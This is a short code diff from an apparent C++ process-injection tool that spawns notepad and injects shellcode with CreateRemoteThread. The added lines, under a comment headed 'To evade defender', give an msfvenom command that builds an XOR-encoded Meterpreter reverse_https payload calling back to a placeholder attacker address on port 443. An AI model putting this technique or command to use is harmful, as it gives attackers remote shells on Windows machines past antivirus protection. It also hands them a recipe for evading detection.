@@ -2,6 +2,10 @@
 // Spawn notepad, inject shellcode into notepad process to pop calc
 // Uses CreateRemoteThread.  Will be blocked by Defender (default meterp template)
 
+// To evade defender:
+//  msfvenom -p windows/x64/meterpreter/reverse_https LHOST=x.x.x.x LPORT=443 --encoder x64/xor_dynamic -f c 
+
+
 #include <iostream>
 #include <windows.h>
 
